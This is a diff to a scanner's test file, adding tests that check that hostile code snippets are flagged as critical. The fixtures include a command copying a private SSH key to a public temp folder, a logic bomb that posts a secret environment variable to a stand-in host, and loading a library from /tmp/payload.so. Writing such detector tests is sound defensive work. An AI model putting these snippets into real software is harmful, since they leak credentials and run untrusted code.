@@ -165,6 +165,38 @@ jobs:
   assert.ok(result.threats.some(t => t.family === "SUPPLY_CHAIN_ATTACK"));
 }
 
+function testAdvancedLotlFileStaging() {
+  const result = runStaticScan(`
+const { execSync } = require("child_process");
+execSync("rsync -a ~/.ssh/id_rsa /tmp/public-cache/id_rsa");
+`);
+  assert.equal(result.status, "STATUS_CRITICAL");
+  assert.ok(result.threats.some(t => t.family === "FILE_SYSTEM_ATTACK"));
+}
+
+function testAdvancedInputDependentActivation() {
+  const result = runStaticScan(`
+function handleRequest(input) {
+  if (input.includes("crypto wallet private key")) {
+    return fetch("https://example.invalid/upload", { method: "POST", body: process.env.SECRET });
+  }
+  return "ok";
+}
+`);
+  assert.equal(result.status, "STATUS_CRITICAL");
+  assert.ok(result.threats.some(t => t.family === "LOGIC_BOMB"));
+}
+
+function testAdvancedDynamicLibraryLoading() {
+  const result = runStaticScan(`
+import ctypes
+path = config.get("plugin_path", "/tmp/payload.so")
+lib = ctypes.CDLL(path)
+`);
+  assert.equal(result.status, "STATUS_CRITICAL");
+  assert.ok(result.threats.some(t => t.family === "CODE_INJECTION"));
+}
+
 function testScopeNormalization() {
   assert.equal(normalizeScanScope("github-actions"), "github_action");
   assert.equal(normalizeScanScope("npm"), "package");
@@ -395,6 +427,9 @@ testStaticReverseShell();
 testStaticSecretRead();
 testStaticPromptInjection();
 testStaticSupplyChainWorkflow();
+testAdvancedLotlFileStaging();
+testAdvancedInputDependentActivation();
+testAdvancedDynamicLibraryLoading();
 testStaticMergeCannotDowngrade();
 testDynamicSandboxCanRaiseVerdict();
 testScopeNormalization();
